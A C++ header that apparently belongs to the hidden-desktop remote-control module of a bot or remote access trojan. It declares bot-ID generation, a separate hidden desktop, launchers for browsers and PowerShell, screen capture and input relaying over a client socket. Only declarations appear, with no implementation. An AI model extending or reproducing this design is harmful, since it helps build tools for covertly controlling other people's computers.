#pragma once
#include"../../../PublicInclude/Manager.h"

#define BOT_ID_LEN 35

struct EnumHwndsPrintData
{
	HDC hDc;
	HDC hDcScreen;
};

class CDesktopManager : public CManager
{
public:
	bool start = FALSE;
	CDesktopManager(CClientSocket* pClient);
	virtual ~CDesktopManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	HANDLE					m_hWorkThread;
	char						    desktopName[MAX_PATH];
	HDESK						hDesk;
	BOOL						m_bIsWorking;
	void CopyDir(char* from, char* to);
	void GetBotId(char* botId);
	ULONG PseudoRand(ULONG* seed);
	void OpenExplorer();
	void OpenRun();
	void OpenChrome();
	void OpenEdge();
	void OpenFirefox();
	void OpenIE();
	void Openpowershell();
	void MyCreateProcess(char* command);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static void sendScreen(PVOID classs);
	static BOOL GetDeskPixels();
	POINT      lastPoint = { 0 };
	BOOL       lmouseDown = FALSE;
	HWND       hResMoveWindow = NULL;
	LRESULT    resMoveType = NULL;
};

typedef DWORD(__stdcall* RtlCompressBuffer_Fn)(
	IN ULONG    CompressionFormat,
	IN PVOID    SourceBuffer,
	IN ULONG    SourceBufferLength,
	OUT PVOID   DestinationBuffer,
	IN ULONG    DestinationBufferLength,
	IN ULONG    Unknown,
	OUT PULONG  pDestinationSize,
	IN PVOID    WorkspaceBuffer);
typedef DWORD(__stdcall* RtlGetCompressionWorkSpaceSize_Fn)(
	IN ULONG    CompressionFormat,
	OUT PULONG  pNeededBufferSize,
	OUT PULONG  pUnknown);